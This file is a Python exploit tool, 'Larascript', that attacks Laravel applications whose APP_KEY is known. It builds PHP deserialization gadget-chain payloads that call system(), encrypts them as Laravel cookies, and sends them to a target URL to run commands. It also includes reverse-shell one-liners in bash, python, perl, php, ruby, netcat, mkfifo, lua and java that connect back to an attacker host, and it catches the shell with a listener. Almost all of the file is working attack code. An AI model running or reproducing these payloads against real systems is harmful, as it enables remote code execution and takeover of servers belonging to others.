#!/usr/bin/env python3
# coding: utf-8

"""
 _                                           _         _
| |      __ _  _ __   __ _  ___   ___  _ __ (_) _ __  | |_
| |     / _` || '__| / _` |/ __| / __|| '__|| || '_ \ | __|
| |___ | (_| || |   | (_| |\__ \| (__ | |   | || |_) || |_
|_____| \__,_||_|    \__,_||___/ \___||_|   |_|| .__/  \__|
                                               |_|

Authors: @pwnedshell & @rsgbengi
https://github.com/PwnedShell/Larascript/
"""

from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256
import time
import sys
import base64
import hmac
import json
import argparse
import requests
from pwn import *
from bs4 import BeautifulSoup
from art import tprint
import signal
import sys


def generatePayload(command, key, method):
    def switchMethod(method):
        switcher = {
            1: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(command)) + ':"' + command + '";}'),
            2: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(command)) + ':"' + command + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(command)) + ':"' + command + '";}'),
            3: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(command)) + ':"' + command + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'),
            4: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(command)) + ':"' + command + '";}'),
            # 5: ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(command) + 15) + ':"<?php ' + command + ' exit; ?>";}}}')
        }
        return switcher.get(method, "Invalid method")

    payloadRCE = switchMethod(method)
    payloadBase64 = base64.b64encode(payloadRCE.encode()).decode("utf-8")
    plainTextKey = base64.b64decode(key)
    return encrypt(payloadBase64, plainTextKey)


def encrypt(text, key):
    cipher = AES.new(key, AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
    payload = base64.b64encode(value)
    iv_base64 = base64.b64encode(cipher.iv)
    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
    iv_base64 = iv_base64.decode("utf-8")
    payload = payload.decode("utf-8")
    data = {"iv": iv_base64, "value": payload, "mac": hashed_mac}
    json_data = json.dumps(data)
    payload_encoded = base64.b64encode(json_data.encode()).decode("utf-8")
    return payload_encoded


def sendPayloadShell(payload, shell, url, command):
    cookies = {"X-XSRF-TOKEN": payload}
    welcomeCommand = "clear && echo -e '[\e[32m+\e[39m] \e[32mYou are in!\e[39m Enjoy :P\e[39m'"
    try:
        r = requests.post(url=url, cookies=cookies, timeout=3)
        if(not pwnShell.connected()):
            log.failure("Connection couldn't be established")
            log.warning(
                "You can try to connect with a different shell. See help (-h)")
    except Exception as er:
        try:
            pwnShell.sendline(
                """ /usr/bin/python3.8 -c 'import pty; pty.spawn("/bin/bash")'""")
            pwnShell.sendline("export SHELL=bash")
            pwnShell.sendline("export TERM=xterm")
            pwnShell.sendline("clear")
            pwnShell.sendline(welcomeCommand)
            if(command != "Default welcome echo"):
                pwnShell.sendline(command)
            pwnShell.interactive()
        except Exception as e:
            log.failure("Error: "+str(e))
            log.failure("Error: "+str(er))
            log.warning(
                "Make sure URL and APP_KEY are the correct ones and host is reachable. See help (-h)")


def sendPayloadCommand(payload, url):
    cookies = {"X-XSRF-TOKEN": payload}
    try:
        l = log.progress('Sending command')
        l.status('...')
        r = requests.post(url=url, cookies=cookies)
        soup = BeautifulSoup(r.text.split("</html>")[1], "lxml")
        text = soup.get_text()
        time.sleep(1)
        l.success("Done")
        print(text.rstrip())
    except Exception as e:
        log.failure("Error: "+str(e))
        log.warning(
            "Make sure URL and APP_KEY are the correct ones and host is reachable. See help (-h)")


def signal_handler(signal, frame):
    log.failure("Exiting...")
    sys.exit(0)


if __name__ == "__main__":

    signal.signal(signal.SIGINT, signal_handler)
    tprint("Larascript")
    print("Authors: @pwnedshell & @rsgbengi\n")

    # Get user arguments
    argsParser = argparse.ArgumentParser()
    argsParser.add_argument("url", help="The vulnerable URL")
    argsParser.add_argument(
        "-k", "--appkey", help="The APP_KEY of the service", required=True
    )
    argsParser.add_argument(
        "-c",
        "--command",
        default="Default welcome echo",
        help="The command you want to be executed"
    )
    argsParser.add_argument(
        "-m",
        "--method",
        default=1,
        type=int,
        choices=[
            1, 2, 3, 4, 5
        ],
        help="The laravel method"
    )
    argsParser.add_argument(
        "-s",
        "--shell",
        choices=[
            "bash",
            "python",
            "perl",
            "php",
            "ruby",
            "nc",
            "mkfifo",
            "lua",
            "java",
        ],
        help="The reverse shell type"
    )
    argsParser.add_argument("-t", "--shellType",
                            default="bash", choices=["bash", "sh"], help="The type of the spawned shell")
    argsParser.add_argument("-p", "--port", default="80",
                            help="Port of the host to connect to")
    argsParser.add_argument("-P", "--lport", default="4444",
                            help="The port where reverse shell will be attached")
    argsParser.add_argument("-U", "--lhost", default="127.0.0.1",
                            help="The host where reverse shell will connect to")
    arguments = argsParser.parse_args()

    log.info("Url: "+arguments.url)
    log.info("Port: "+arguments.port)
    log.info("Payload: RCE"+str(arguments.method))
    log.info("Command to execute: "+arguments.command)

    # Check if user wants shell
    if arguments.shell is not None:

        def switchReversheShell(shell):
            switcher = {
                "bash": "bash -i >& /dev/tcp/"
                + str(arguments.lhost)
                + "/"
                + str(arguments.lport)
                + " 0>&1",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""
                + str(arguments.lhost)
                + '",'
                + str(arguments.lport)
                + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/'
                + str(arguments.shellType)
                + '","-i"]);\'',
                "perl": "perl '-e use Socket;$i=\""
                + str(arguments.lhost)
                + '";$p='
                + str(arguments.lport)
                + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/'
                + str(arguments.shellType)
                + " -i\");};'",
                "php": "php -r '$sock=fsockopen(\""
                + str(arguments.lhost)
                + '",'
                + str(arguments.lport)
                + ');exec("/bin/'
                + str(arguments.shellType)
                + " -i <&3 >&3 2>&3\");'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\""
                + str(arguments.lhost)
                + '",'
                + str(arguments.lport)
                + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
                "nc": "nc -e /bin/"
                + str(arguments.shellType)
                + " "
                + str(arguments.lhost)
                + " "
                + str(arguments.lport),
                "mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/"
                + str(arguments.shellType)
                + " -i 2>&1|nc "
                + str(arguments.lhost)
                + " "
                + str(arguments.lport)
                + " >/tmp/f",
                "lua": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('"
                + str(arguments.lhost)
                + "','"
                + str(arguments.lport)
                + "');os.execute('/bin/"
                + str(arguments.shellType)
                + " -i <&3 >&3 2>&3');\"",
                "java": """r = Runtime.getRuntime()
p = r.exec(["/bin/"""
                + str(arguments.shellType)
                + """\","-c","exec 5<>/dev/tcp/"""
                + str(arguments.lhost)
                + """/"""
                + str(arguments.lport)
                + """;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()""",
            }
            return switcher.get(shell, "Invalid shell")

        reverseShell = switchReversheShell(arguments.shell)

        log.info("Lhost: "+arguments.lhost)
        if (arguments.lhost == "127.0.0.1"):
            log.warning("You may want to change Lhost")
        log.info("Lport: "+arguments.lport)
        log.info("ReverseShell: "+arguments.shell)
        log.info("Type of shell: "+arguments.shellType)

        payload = generatePayload(
            reverseShell, arguments.appkey, arguments.method)
        pwnShell = listen(arguments.lport, timeout=1).wait_for_connection()
        sendPayloadShell(payload, pwnShell, arguments.url, arguments.command)

    else:
        payload = generatePayload(
            arguments.command, arguments.appkey, arguments.method)
        sendPayloadCommand(payload, arguments.url)
